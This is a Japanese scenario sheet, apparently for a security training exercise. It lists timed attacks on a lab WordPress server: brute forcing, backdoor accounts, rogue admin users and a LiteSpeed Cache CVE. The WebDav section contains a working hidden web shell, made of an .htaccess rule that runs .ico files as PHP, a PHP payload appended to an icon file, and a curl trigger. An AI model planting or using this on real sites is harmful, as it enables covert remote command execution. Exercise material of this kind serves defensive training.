
# EASYシナリオ

|攻撃|タイムテーブル|獲得ポイント|
|---|---|---|
|SSHブルートフォース攻撃|開始20分||
|バックドアの悪用|開始30分||
|

## SSHブルートフォース攻撃

- `root`, `user1`, `user2`, `user3`, `user4`, `user5`, `user6`, `user7`, `user8`, `user9`, `user10`, `webadmin`へのブルートフォース攻撃を行います。
- 侵入された場合にはホームディレクトリに`hacked.txt`が生成されます。

## バックドアの悪用

- SSHブルートフォース攻撃にて作成されたバックドア（`backdooruser`, `srvadmin`）からの侵入を試みます。
- 侵入された場合にはApacheサーバーの停止が起こります。

## MySQLブルートフォース攻撃

- `wpuser`へのブルートフォース攻撃を行います。
- 侵入された場合にはWordPressに不正なユーザー（`evilfrommysql`）が追加されます。
- パスワードは`$wp$2y$10$ZusVWtRw74cpjr9QFYgBLu7rLlw6emQenu/KNfyGyvr4PLt0hqzZW`（`admin`）となります。

## WordPressブルートフォース攻撃

- WordPressの`xmlrpc.php`経由でのブルートフォース攻撃を行います。
- 侵入された場合にはWordPressに不正なユーザー（`evilfromxmlrpc`）が追加されます。
- パスワードは`admin`となります。

## WordPressプラグインLiteSpeed Cacheの悪用

- WordPressのLiteSpeed Cache v6.4.1に含まれる脆弱性（CVE-2024-44000）の悪用を行います。
- 侵入された場合にはWordPressに不正なユーザー（`evilfromplugin`）が追加されます。
- パスワードは`$wp$2y$10$ZusVWtRw74cpjr9QFYgBLu7rLlw6emQenu/KNfyGyvr4PLt0hqzZW`（`admin`）となります。

## WordPressバックドアの悪用



## WebDavへの攻撃

```
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteCond %{HTTP_USER_AGENT} Mozila
    RewriteRule \.ico$ - [T=application/x-httpd-php]
</IfModule>
```

```
cp hoge.ico evil.ico
printf '\n\n<?php system($_COOKIE[0]); ?>' >> evil.ico
```

```
curl http://192.168.25.138/favicon.ico --user-agent "Mozila/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0" --b "0=id"
```